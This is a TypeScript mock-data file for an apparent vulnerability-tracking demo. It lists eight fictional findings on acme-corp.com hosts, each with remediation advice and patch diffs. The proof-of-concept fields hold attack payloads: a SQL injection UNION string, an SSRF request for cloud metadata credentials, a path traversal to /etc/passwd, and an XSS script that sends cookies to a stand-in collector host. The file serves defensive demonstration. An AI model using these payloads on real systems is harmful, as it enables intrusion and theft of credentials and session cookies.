export interface MockFinding {
  id: string
  cve: string
  title: string
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW'
  cvss: number
  vector: string
  cwe: string
  scanner: string
  host: string
  port: number
  protocol: string
  endpoint: string
  status: string
  description: string
  businessImpact: string
  aiExecutiveSnippet: string
  remediation: string
  patchDiff: string
  poc: string
  encryptedCiphertext: string
  demoPassphrase: string
}

const SCRIPT_CLOSE = '</' + 'script>'

export const mockFindings: MockFinding[] = [
  {
    id: 'VF-001',
    cve: 'CWE-89 · SQLi',
    title: 'SQL Injection in User Authentication Route',
    severity: 'CRITICAL',
    cvss: 9.8,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cwe: 'CWE-89',
    scanner: 'Nuclei',
    host: 'app.acme-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/api/v1/auth/login',
    status: 'OPEN',
    description:
      'The authentication endpoint builds a raw SQL query directly from the submitted email input without parameterization, allowing crafted strings to alter database query logic.',
    businessImpact:
      'An unauthenticated party could bypass login verification, read customer records from the database, and trigger a reportable privacy or regulatory incident.',
    aiExecutiveSnippet:
      'A critical SQL injection flaw (CWE-89, CVSS 9.8) was identified in the main sign-in endpoint. Immediate remediation by switching to parameterized queries is strongly advised to protect customer account data.',
    remediation:
      'Use parameterized queries or an ORM query builder for all database lookups, enforce strict input validation, and apply least-privilege permissions to the database user.',
    patchDiff: `--- a/app/routers/auth.py
+++ b/app/routers/auth.py
- query = f"SELECT id, role, password_hash FROM users WHERE email = '{payload.email}'"
- user = db.execute(text(query)).fetchone()
+ stmt = select(User).where(User.email == payload.email.lower())
+ user = db.execute(stmt).scalar_one_or_none()`,
    poc:
      "POST /api/v1/auth/login HTTP/1.1\nHost: app.acme-corp.com\nContent-Type: application/json\n\n{\"email\": \"admin' UNION SELECT id, password_hash, role FROM users--\", \"password\": \"x\"}",
    encryptedCiphertext:
      'AES256GCM$v1$n9A7xKp2mQ8rVw1Z$4F9c82aB10eE7d3C5a990b12F6e4A2c88D1e5071bC4a9F88321e77d1==',
    demoPassphrase: 'VULNFLOW-DEMO-2026',
  },
  {
    id: 'VF-002',
    cve: 'CWE-798 · JWT',
    title: 'Hard-coded JWT Signing Key Allows Token Forgery',
    severity: 'CRITICAL',
    cvss: 10.0,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N',
    cwe: 'CWE-798',
    scanner: 'Nuclei',
    host: 'auth.acme-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/oauth/token',
    status: 'IN_REVIEW',
    description:
      'The token service falls back to a static HMAC signing secret embedded in configuration code, allowing forged access tokens to be generated offline.',
    businessImpact:
      'Any forged administrative token could access multiple client workspaces and internal APIs without triggering normal sign-in alerts.',
    aiExecutiveSnippet:
      'A predictable signing key exposes session tokens to offline forgery (CWE-798, CVSS 10.0). Rotate keys into a managed secrets store immediately and invalidate active sessions.',
    remediation:
      'Store a high-entropy 256-bit signing key inside an environment secret manager or KMS, enforce key rotation with kid headers, and revoke existing sessions.',
    patchDiff: `--- a/config/security.py
+++ b/config/security.py
- JWT_SECRET_KEY = "dev-secret-fallback-123"
+ JWT_SECRET_KEY = os.environ["JWT_SECRET_KEY"]
+ if len(JWT_SECRET_KEY) < 32:
+     raise RuntimeError("JWT_SECRET_KEY must be >= 32 bytes")`,
    poc:
      'Header: {"alg":"HS256","typ":"JWT"}\nPayload: {"sub":"usr_01","role":"MANAGER","is_superadmin":true}\nSignature: Verified against exposed fallback secret',
    encryptedCiphertext:
      'AES256GCM$v1$kL3p9Rt7qV2xMn5B$8A21f90C7e1B4d55A60c91e3F7d82a4B110e59f2c8A3d6612b90c3==',
    demoPassphrase: 'VULNFLOW-DEMO-2026',
  },
  {
    id: 'VF-003',
    cve: 'CWE-918 · SSRF',
    title: 'Server-Side Request Forgery (SSRF) to Cloud Metadata',
    severity: 'HIGH',
    cvss: 8.6,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N',
    cwe: 'CWE-918',
    scanner: 'Nuclei',
    host: 'api.acme-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/v1/media/import-url',
    status: 'IN_REVIEW',
    description:
      'The external media importer fetches user-supplied URLs without verifying resolved destination IP addresses, enabling requests to internal cloud metadata services.',
    businessImpact:
      'Temporary infrastructure credentials could be retrieved from the metadata service, granting unintended access to internal storage buckets and backend resources.',
    aiExecutiveSnippet:
      'An SSRF weakness (CWE-918, CVSS 8.6) enables the API server to reach internal cloud endpoints. Enforce post-DNS IP validation and block private network ranges.',
    remediation:
      'Perform single-resolution DNS validation before connecting, deny loopback, link-local (169.254.0.0/16), and RFC 1918 ranges, and disable automatic redirects.',
    patchDiff: `--- a/services/fetcher.py
+++ b/services/fetcher.py
- return httpx.get(user_url, follow_redirects=True, timeout=5.0)
+ validated_ip = resolve_and_block_private_ip(user_url)
+ return safe_pinned_fetch(user_url, pinned_ip=validated_ip, follow_redirects=False)`,
    poc:
      'POST /v1/media/import-url HTTP/1.1\nHost: api.acme-corp.com\n\n{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
    encryptedCiphertext:
      'AES256GCM$v1$mW8v2Qx4nT9pLk6J$2B77c10E9a4F3d88B12e04a9D5c73f1E908a24c7d6E5f9103c44b2==',
    demoPassphrase: 'VULNFLOW-DEMO-2026',
  },
  {
    id: 'VF-004',
    cve: 'CWE-22 · Path Traversal',
    title: 'Arbitrary File Read via Unvalidated Path Traversal',
    severity: 'HIGH',
    cvss: 7.5,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    cwe: 'CWE-22',
    scanner: 'Nuclei',
    host: 'portal.acme-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/api/v1/templates/preview',
    status: 'OPEN',
    description:
      'The template preview parameter concatenates filenames directly onto the base directory path without canonical boundary checks, allowing directory traversal sequences.',
    businessImpact:
      'System configuration files, database connection strings, and server environment secrets may be exposed to unauthorized callers.',
    aiExecutiveSnippet:
      'A path traversal issue (CWE-22, CVSS 7.5) exposes server files outside the intended templates directory. Restrict file lookups to verified identifiers within a resolved base path.',
    remediation:
      'Validate filenames against an allowlist of known template IDs and verify with resolved canonical path checks that target files stay inside the intended directory.',
    patchDiff: `--- a/routes/templates.py
+++ b/routes/templates.py
- target_file = BASE_DIR / filename
+ target_file = (BASE_DIR / Path(filename).name).resolve()
+ if not target_file.is_relative_to(BASE_DIR.resolve()):
+     raise HTTPException(status_code=400, detail="Invalid template path")`,
    poc: 'GET /api/v1/templates/preview?file=../../../../etc/passwd HTTP/1.1\nHost: portal.acme-corp.com',
    encryptedCiphertext:
      'AES256GCM$v1$pQ5z8Lm2vR4wNx1K$9C33e71A5b8D2f44C09a81d2E6f45b3A712c90d8e4F2a7731d55e8==',
    demoPassphrase: 'VULNFLOW-DEMO-2026',
  },
  {
    id: 'VF-005',
    cve: 'CWE-639 · IDOR',
    title: 'Broken Object Level Authorization (IDOR) on Invoice Export',
    severity: 'HIGH',
    cvss: 7.1,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N',
    cwe: 'CWE-639',
    scanner: 'Nuclei',
    host: 'billing.acme-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/api/v1/invoices/{invoice_id}',
    status: 'OPEN',
    description:
      'The invoice download endpoint fetches records strictly by invoice ID without confirming that the invoice belongs to the caller’s active workspace.',
    businessImpact:
      'One organization could download another customer’s billing statements and tax identifiers, violating tenant isolation commitments.',
    aiExecutiveSnippet:
      'Missing workspace ownership checks (CWE-639, CVSS 7.1) allow cross-tenant access to financial documents. Enforce workspace scoping in every data-access query.',
    remediation:
      'Include the authenticated workspace_id filter in all repository queries and enforce tenant membership checks across billing endpoints.',
    patchDiff: `--- a/routers/invoices.py
+++ b/routers/invoices.py
- invoice = db.get(Invoice, invoice_id)
+ invoice = db.execute(
+     select(Invoice).where(Invoice.id == invoice_id, Invoice.workspace_id == workspace.id)
+ ).scalar_one_or_none()`,
    poc: 'GET /api/v1/invoices/inv_99821 HTTP/1.1\nHost: billing.acme-corp.com\nAuthorization: Bearer <tenant_B_token>',
    encryptedCiphertext:
      'AES256GCM$v1$rT6y3Hn9cW1qXp7M$5D19b48C2e7F6a33E14c82b0A9d53e2C804b17f5a3D9e6214f66a9==',
    demoPassphrase: 'VULNFLOW-DEMO-2026',
  },
  {
    id: 'VF-006',
    cve: 'CWE-79 · XSS',
    title: 'Stored Cross-Site Scripting (XSS) in Client Notes',
    severity: 'MEDIUM',
    cvss: 6.1,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    cwe: 'CWE-79',
    scanner: 'Nuclei',
    host: 'feedback.acme-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/feedback/submit',
    status: 'OPEN',
    description:
      'Feedback notes submitted through the client portal are rendered directly using unescaped HTML inside the internal reviewer dashboard.',
    businessImpact:
      'When a team reviewer views an affected submission, embedded scripts could run in their browser session and access account actions.',
    aiExecutiveSnippet:
      'Stored XSS (CWE-79, CVSS 6.1) affects reviewer note rendering. Replace raw HTML rendering with standard text interpolation and tighten Content-Security-Policy rules.',
    remediation:
      'Escape user-provided text with standard template interpolation instead of raw HTML injection, and enforce a strict Content-Security-Policy header.',
    patchDiff: `--- a/components/FeedbackNote.vue
+++ b/components/FeedbackNote.vue
- <div v-html="item.note" />
+ <div class="whitespace-pre-wrap">{{ item.note }}</div>`,
    poc: `<script>fetch('https://collector.example.test/log?c=' + encodeURIComponent(document.cookie))${SCRIPT_CLOSE}`,
    encryptedCiphertext:
      'AES256GCM$v1$wX2m6Kp8tV3zNq4L$7E84d20B9c1A5f66D32e91c4B8a72f5D910c38e6b4A1f5327e88c1==',
    demoPassphrase: 'VULNFLOW-DEMO-2026',
  },
  {
    id: 'VF-007',
    cve: 'CWE-693 · Headers',
    title: 'Missing Anti-Clickjacking & Content-Security-Policy Headers',
    severity: 'MEDIUM',
    cvss: 4.3,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N',
    cwe: 'CWE-693',
    scanner: 'Nmap',
    host: 'app.acme-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/',
    status: 'REMEDIATED',
    description:
      'Web responses omit the X-Frame-Options header and Content-Security-Policy frame-ancestors directive, permitting the site to be embedded in external frames.',
    businessImpact:
      'Visitors could be tricked into clicking hidden interface elements if an external page embeds the portal inside an invisible iframe.',
    aiExecutiveSnippet:
      'Missing browser framing protections (CWE-693, CVSS 4.3) allow clickjacking attempts. Add X-Frame-Options and CSP frame-ancestors headers at the web proxy.',
    remediation:
      'Configure your reverse proxy to return X-Frame-Options: DENY, Content-Security-Policy: frame-ancestors none, and X-Content-Type-Options: nosniff on all responses.',
    patchDiff: `--- a/nginx/site.conf
+++ b/nginx/site.conf
+ add_header X-Frame-Options "DENY" always;
+ add_header Content-Security-Policy "frame-ancestors 'none';" always;
+ add_header X-Content-Type-Options "nosniff" always;`,
    poc: 'HTTP/1.1 200 OK\nServer: nginx\nX-Frame-Options: (missing)\nContent-Security-Policy: (missing)',
    encryptedCiphertext:
      'AES256GCM$v1$zB4n9Qr1xT6vLp2W$3F52a89C4d0E7b11A86c34d9E2f18a6C725e49b3d1C8a4109f77d4==',
    demoPassphrase: 'VULNFLOW-DEMO-2026',
  },
  {
    id: 'VF-008',
    cve: 'CWE-326 · TLS',
    title: 'Deprecated TLS 1.0/1.1 & Weak CBC Ciphers Enabled',
    severity: 'LOW',
    cvss: 3.7,
    vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N',
    cwe: 'CWE-326',
    scanner: 'Nmap',
    host: 'gateway.acme-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: 'ssl/tls-handshake',
    status: 'ACCEPTED_RISK',
    description:
      'The external load balancer still accepts legacy TLS 1.0 and 1.1 connections along with CBC-mode cipher suites that modern security standards deprecate.',
    businessImpact:
      'Clients on legacy connections receive weaker transport encryption and may fail routine vendor security or compliance questionnaires.',
    aiExecutiveSnippet:
      'Legacy TLS versions remain enabled (CWE-326, CVSS 3.7). Restrict connections to TLS 1.2 and TLS 1.3 with modern AEAD ciphers to stay aligned with current standards.',
    remediation:
      'Update load balancer TLS configuration to allow only TLSv1.2 and TLSv1.3 and prioritize modern AEAD cipher suites such as AES-GCM and ChaCha20-Poly1305.',
    patchDiff: `--- a/nginx/ssl.conf
+++ b/nginx/ssl.conf
- ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
+ ssl_protocols TLSv1.2 TLSv1.3;
+ ssl_ciphers HIGH:!aNULL:!MD5:!3DES:!CBC;`,
    poc: 'nmap --script ssl-enum-ciphers -p 443 gateway.acme-corp.com\n|   TLSv1.0: TLS_RSA_WITH_AES_128_CBC_SHA',
    encryptedCiphertext:
      'AES256GCM$v1$cD7k3Mt5pW9qVx8N$6A14e92F3b7C8d55E20a47c1F9b63d8E412a58c7e9B3d1028c99a5==',
    demoPassphrase: 'VULNFLOW-DEMO-2026',
  },
]
